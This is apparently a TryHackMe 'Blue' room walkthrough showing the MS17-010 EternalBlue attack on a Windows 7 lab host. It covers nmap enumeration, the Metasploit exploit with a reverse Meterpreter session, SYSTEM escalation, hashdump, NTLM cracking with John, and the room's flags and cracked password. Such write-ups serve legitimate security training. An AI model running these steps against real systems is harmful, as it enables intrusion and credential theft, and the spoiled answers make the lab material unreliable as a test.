# 🔵 TryHackMe - Blue (EternalBlue)

<div align="center">

## 🔗 Room Link

https://tryhackme.com/room/blue

**Room:** Blue  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Focus:** SMB Enumeration, MS17-010 (EternalBlue), Privilege Escalation, Password Cracking

</div>

---

## 📖 Overview

This room demonstrates exploitation of the famous **MS17-010 EternalBlue** vulnerability against a vulnerable Windows 7 machine.

### Skills Practiced

- Network Reconnaissance
- Nmap Enumeration
- SMB Service Analysis
- EternalBlue Exploitation
- Meterpreter Usage
- Privilege Escalation
- Hash Dumping
- Password Cracking with John The Ripper

---

## 🎯 Target Information

| Item | Value |
|--------|--------|
| Target IP | `10.10.33.26` |
| Hostname | `blue.thm` |
| Operating System | Windows 7 Professional SP1 |
| Vulnerability | MS17-010 EternalBlue |

---

# Task 1 - Reconnaissance

## Add Host Entry

```bash
echo "10.10.33.26 blue.thm" >> /etc/hosts
```

## Ping Discovery

```bash
ping -c 3 blue.thm
```

Observed:

```text
TTL=127
```

### Finding

TTL close to **128** typically indicates a **Windows** operating system.

---

## Scan Ports

```bash
nmap -p1-1000 --open -sS -n -Pn blue.thm
```

### Results

| Port | Service |
|--------|--------|
| 135 | MSRPC |
| 139 | NetBIOS |
| 445 | SMB |

**Open ports under 1000:** `3`

---

## Service Enumeration

```bash
nmap -p135,139,445 -sV -sC -Pn blue.thm
```

Important result:

```text
Windows 7 Professional 7601 Service Pack 1
```

### Vulnerability Identified

```text
MS17-010
```

Known as:

```text
EternalBlue
```

---

# Task 2 - Gain Access

## Search Exploit

```bash
msfconsole
search ms17-010
```

Selected module:

```text
exploit/windows/smb/ms17_010_eternalblue
```

---

## Configure Exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue

set RHOSTS blue.thm
set LHOST <YOUR_IP>

run
```

### Required Option

```text
RHOSTS
```

---

## Successful Exploitation

After running the exploit:

```text
Meterpreter Session Opened
```

System access obtained.

---

# Task 3 - Privilege Escalation

## Upgrade Shell

Search module:

```bash
search shell_to_meterpreter
```

Module:

```text
post/multi/manage/shell_to_meterpreter
```

---

## Configure Session

```bash
sessions

set SESSION <ID>

run
```

---

## Verify Privileges

```bash
getuid
```

Output:

```text
NT AUTHORITY\SYSTEM
```

Highest Windows privilege successfully obtained.

---

# Task 4 - Password Cracking

## Dump Password Hashes

```bash
hashdump
```

Discovered user:

```text
Jon
```

---

## Extract Hash

```text
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Save hash:

```bash
echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > jon_hash.txt
```

---

## Crack Hash

```bash
john --format=nt \
--wordlist=/usr/share/wordlists/rockyou.txt \
jon_hash.txt
```

### Password Found

```text
alqfna22
```

### Credentials

```text
jon : alqfna22
```

---

# Task 5 - Capture Flags

## 🚩 Flag 1

Location:

```text
C:\
```

Flag:

```text
flag{access_the_machine}
```

---

## 🚩 Flag 2

Location:

```text
C:\Windows\System32\config
```

Flag:

```text
flag{sam_database_elevated_access}
```

---

## 🚩 Flag 3

Search:

```bash
search -f flag3.txt
```

Flag:

```text
flag{admin_documents_can_be_valuable}
```

---

# 🛠 Tools Used

- Nmap
- Metasploit Framework
- Meterpreter
- John The Ripper
- SMB Enumeration

---

# 📚 Key Takeaways method

- Identified Windows host via TTL analysis.
- Enumerated SMB services using Nmap.
- Discovered MS17-010 vulnerability.
- Exploited EternalBlue using Metasploit.
- Obtained SYSTEM privileges.
- Dumped Windows password hashes.
- Cracked NTLM hash using John The Ripper.
- Retrieved all room flags successfully.

---

## ⚠️ Disclaimer

This repository is intended for educational purposes only. Perform security testing only on systems you own or have explicit permission to test.

---



---

### ⭐ If this walkthrough helped you, consider giving the repository a star.
